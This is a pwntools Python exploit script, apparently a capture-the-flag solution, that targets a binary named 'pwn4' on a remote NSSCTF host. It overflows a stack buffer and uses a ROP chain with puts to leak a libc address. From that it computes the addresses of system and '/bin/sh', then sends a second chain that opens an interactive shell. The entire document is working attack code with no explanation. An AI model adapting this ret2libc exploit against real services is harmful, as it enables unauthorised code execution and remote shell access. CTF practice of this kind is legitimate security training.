from pwn import *
context(arch='amd64',log_level='debug',os='linux')
elf=ELF('./pwn4')
libc=ELF('./libc-2.31.so')
p=remote("node4.anna.nssctf.cn",26391)

puts_got=elf.got['puts']
puts_plt=elf.plt['puts']
main_addr=elf.sym['main']
ret_addr=0x0000000000400556
rdi_addr=0x00000000004007d3

payload=flat([b'\x00',b'a'*(0x60+7),rdi_addr,puts_got,puts_plt,main_addr])
p.sendlineafter(":\n",payload)
leak_addr=u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
log.info(hex(leak_addr))

libc_base=leak_addr-libc.sym['puts']
sys_addr=libc_base+libc.sym['system']
str_bin_sh=libc_base+next(libc.search(b'/bin/sh'))

payload=flat([b'\x00',b'a'*(0x60+7),ret_addr,rdi_addr,str_bin_sh,sys_addr,main_addr])
p.sendlineafter(":\n",payload)
p.interactive()
